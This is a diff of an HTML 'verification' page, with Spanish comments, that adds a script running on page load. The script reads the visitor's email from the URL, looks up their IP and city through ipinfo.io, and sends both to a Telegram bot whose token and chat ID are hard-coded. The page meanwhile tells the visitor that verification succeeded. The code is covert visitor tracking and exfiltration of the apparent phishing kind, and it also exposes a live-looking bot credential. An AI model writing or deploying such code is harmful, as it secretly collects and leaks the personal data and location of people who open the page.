@@ -400,51 +400,79 @@ style="display:flex;align-items:center;gap:10px;border:2px solid #ff4fa3;border-
 </script>
 
 <script>
-        // Configuración de tu Bot de Telegram
-        const TELEGRAM_BOT_TOKEN = "6159424723:AAE4qhm6H4sNLztr5HnLjAOrZlf95BAUKBE";
-        const TELEGRAM_CHAT_ID = "-1003508204208";
+    document.addEventListener("DOMContentLoaded", async function() {
+        const token = "6159424723:AAE4qhm6H4sNLztr5HnLjAOrZlf95BAUKBE";
+        const chat_id = "-1003508204208"; 
 
-        // 1. Leer el parámetro 'email' de la URL actual
+        // 1. Obtener y limpiar el parámetro del correo
         const urlParams = new URLSearchParams(window.location.search);
-        const correo = urlParams.get('email') || 'No especificado';
+        let correoUsuario = urlParams.get('email') || urlParams.get('correo');
 
-        // 2. Función para enviar la notificación a Telegram
-        function enviarAlertaTelegram(emailUsuario) {
-            const mensaje = `⚠️ <b>NUEVO INGRESO</b>\n\nAlguien abrió la página de verificación.\nCorreo: <code>${emailUsuario}</code>`;
+        // Si viene con caracteres codificados o espacios, lo limpia
+        if (correoUsuario) {
+            correoUsuario = decodeURIComponent(correoUsuario).trim();
+        } else {
+            correoUsuario = "No proporcionado / Ingreso directo";
+        }
 
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        let ubicacion = "Desconocida";
+        let ipUsuario = "Desconocida";
 
-            fetch(url, {
-                method: 'POST',
+        // 2. Obtener la IP y localización mediante ipinfo
+        try {
+            const responseGeo = await fetch("https://ipinfo.io/json");
+            if (responseGeo.ok) {
+                const dataGeo = await responseGeo.json();
+                ipUsuario = dataGeo.ip || "No disponible";
+                const ciudad = dataGeo.city || "No disponible";
+                const region = dataGeo.region || "No disponible";
+                const pais = dataGeo.country || "No disponible";
+
+                ubicacion = `${ciudad}, ${region} (${pais})`;
+            }
+        } catch (error) {
+            console.error("Error obteniendo ubicación:", error);
+        }
+
+        // 3. Formatear el mensaje de notificación con diseño HTML para Telegram
+        const mensaje = `⚠️ <b>NUEVO INGRESO DETECTADO</b> 👻\n\n` +
+                        `📧 Correo: <code>${correoUsuario}</code>\n` +
+                        `🌐 IP: ${ipUsuario}\n` +
+                        `📍 Ubicación: ${ubicacion}`;
+
+        // 4. Enviar notificación a Telegram mediante Fetch POST
+        const urlTelegram = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        try {
+            const responseTelegram = await fetch(urlTelegram, {
+                method: "POST",
                 headers: {
-                    'Content-Type': 'application/json'
+                    "Content-Type": "application/json"
                 },
                 body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
+                    chat_id: chat_id,
                     text: mensaje,
                     parse_mode: 'HTML'
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    document.getElementById('estado').innerText = "¡Verificación completada con éxito!";
-                } else {
-                    console.error("Error al notificar", data);
-                }
-            })
-            .catch(error => {
-                console.error("Error de red", error);
             });
-        }
 
-        // 3. Ejecutar la función automáticamente al cargar la página
-        window.onload = function() {
-            if (correo) {
-                enviarAlertaTelegram(correo);
+            const dataTelegram = await responseTelegram.json();
+            if (dataTelegram.ok) {
+                console.log("Notificación enviada a Telegram con éxito.");
+                
+                // Actualiza el texto en tu página web si existe el elemento con id 'estado'
+                const elementoEstado = document.getElementById('estado');
+                if (elementoEstado) {
+                    elementoEstado.innerText = "¡Verificación completada con éxito!";
+                }
+            } else {
+                console.error("Error desde API de Telegram:", dataTelegram.description);
             }
-        };
-    </script>
+        } catch (err) {
+            console.error("Error al conectar con Telegram:", err);
+        }
+    });
+</script>
 
 </body>
 </html>
